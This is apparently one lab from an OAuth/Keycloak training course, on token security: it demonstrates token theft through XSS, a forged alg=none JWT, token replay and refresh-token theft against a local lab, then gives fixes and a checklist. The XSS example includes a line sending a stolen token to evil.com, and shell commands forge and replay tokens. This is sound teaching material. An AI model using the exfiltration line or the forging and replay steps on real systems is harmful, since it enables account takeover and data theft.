# Lab 10: Token Security — Attacks and Best Practices

## The Problem

```
Tokens are powerful. If stolen, an attacker can:
  - Call APIs as the victim
  - Access protected data
  - Perform actions on behalf of the user

How do we prevent this?
```

---

## Attack 1: Token Theft via XSS

```
If you store tokens in localStorage:
  localStorage.setItem('token', 'eyJ...');

ANY JavaScript on the page can read it:
  const stolen = localStorage.getItem('token');
  fetch('https://evil.com/steal?t=' + stolen);

If your site has an XSS vulnerability,
attacker's script steals the token.
```

### The Fix

```
                  JS Access?  Survives Refresh?  XSS Safe?
HTTP-only cookie    NO            YES              YES
In-memory var       NO            NO               YES
sessionStorage      YES           NO               PARTIAL
localStorage        YES           YES              NO  ← WORST
```

> **Rule:** Never store tokens in localStorage.

---

## Attack 2: Forging a Token (alg=none)

```bash
# Create a fake JWT with no signature
FAKE_H=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '/+' '_-')
FAKE_P=$(echo -n '{"sub":"hacker","preferred_username":"admin","realm_access":{"roles":["admin"]}}' | base64 | tr -d '=' | tr '/+' '_-')
FAKE_TOKEN="${FAKE_H}.${FAKE_P}."

echo "Fake token created. Trying to use it..."

# Try against Keycloak
curl -s http://localhost:8180/realms/foodexpress/protocol/openid-connect/userinfo \
  -H "Authorization: Bearer $FAKE_TOKEN" | jq .
# REJECTED!

# Try against Resource Server
curl -s http://localhost:8080/profile -H "Authorization: Bearer $FAKE_TOKEN"
# REJECTED!
```

> **Why it fails:** Both Keycloak and Spring Boot reject `alg: none`. Modern libraries whitelist algorithms.

---

## Attack 3: Token Replay (stolen valid token)

```bash
# Get Rahul's token
TOKEN=$(curl -s -X POST http://localhost:8180/realms/foodexpress/protocol/openid-connect/token \
  -d "grant_type=password&client_id=foodexpress-web&client_secret=web-secret-123&username=rahul&password=password123" \
  | jq -r '.access_token')

# "Attacker" uses the same token from another machine
curl -s http://localhost:8080/profile -H "Authorization: Bearer $TOKEN" | jq .preferred_username
# Works! Attacker sees Rahul's data for 5 minutes.
```

### The Fix

```
1. SHORT expiry (5 min) — limits the damage window
2. HTTPS everywhere — prevents interception in transit
3. Audience validation — token for Service A rejected by Service B
```

---

## Attack 4: Refresh Token Theft

```bash
# Get tokens
RESPONSE=$(curl -s -X POST http://localhost:8180/realms/foodexpress/protocol/openid-connect/token \
  -d "grant_type=password&client_id=foodexpress-web&client_secret=web-secret-123&username=rahul&password=password123&scope=openid")
REFRESH=$(echo $RESPONSE | jq -r '.refresh_token')

# "Attacker" uses stolen refresh token to get new access tokens
curl -s -X POST http://localhost:8180/realms/foodexpress/protocol/openid-connect/token \
  -d "grant_type=refresh_token" \
  -d "client_id=foodexpress-web" \
  -d "client_secret=web-secret-123" \
  -d "refresh_token=$REFRESH" | jq '{has_new_token: (.access_token != null)}'
# Attacker got a new token!

# But now the REAL user tries to refresh with the same token
curl -s -X POST http://localhost:8180/realms/foodexpress/protocol/openid-connect/token \
  -d "grant_type=refresh_token" \
  -d "client_id=foodexpress-web" \
  -d "client_secret=web-secret-123" \
  -d "refresh_token=$REFRESH" | jq .
# FAILS! Token was already used. Rotation detected the theft.
```

> **Rotation:** Each refresh invalidates the old token. If two parties try to use the same refresh token, Keycloak revokes everything.

---

## Security Checklist

```
TOKEN STORAGE:
  [ ] Never store in localStorage
  [ ] Use HTTP-only cookies or in-memory
  [ ] Clear tokens on logout

TOKEN TRANSPORT:
  [ ] Always HTTPS in production
  [ ] Never send tokens in URL parameters
  [ ] Use Authorization header

TOKEN VALIDATION (Resource Server):
  [ ] Verify signature (JWKS)
  [ ] Check expiry (exp)
  [ ] Check issuer (iss)
  [ ] Check audience (aud)
  [ ] Reject alg=none

TOKEN LIFECYCLE:
  [ ] Short access token expiry (5-15 min)
  [ ] Refresh token rotation enabled
  [ ] Logout revokes refresh tokens

KEYCLOAK CONFIG:
  [ ] RS256 algorithm (not HS256)
  [ ] PKCE enforced for public clients
  [ ] Implicit flow disabled
  [ ] Redirect URIs restricted (no wildcards)
  [ ] Direct access grants off in production
  [ ] Brute force protection enabled
```

---

## Summary: Complete OAuth Picture

```
Lab 01: Keycloak Setup        → Authorization Server
Lab 02: Endpoints             → What the server exposes
Lab 03: Grant Types           → How clients get tokens
Lab 04: Tokens Deep Dive      → What's inside tokens
Lab 05: Auth Code Flow        → Web app login (Node.js + Spring Boot)
Lab 06: Client Credentials    → Service-to-service (machine tokens)
Lab 07: PKCE Flow             → SPA login (browser-only)
Lab 08: OIDC                  → Identity layer (id_token)
Lab 09: Secure Microservices  → Role-based access control
Lab 10: Token Security        → Attacks and prevention

┌──────────────┐     ┌──────────────────┐     ┌──────────────────┐
│   CLIENT     │ ──> │  AUTHORIZATION   │ ──> │  RESOURCE        │
│   (Node.js)  │     │  SERVER          │     │  SERVER          │
│              │     │  (Keycloak)      │     │  (Spring Boot)   │
│ Auth Code    │     │  Issues tokens   │     │  Validates JWT   │
│ PKCE         │     │  Manages users   │     │  Checks roles    │
│ Client Creds │     │  Manages roles   │     │  Enforces access │
└──────────────┘     └──────────────────┘     └──────────────────┘
```
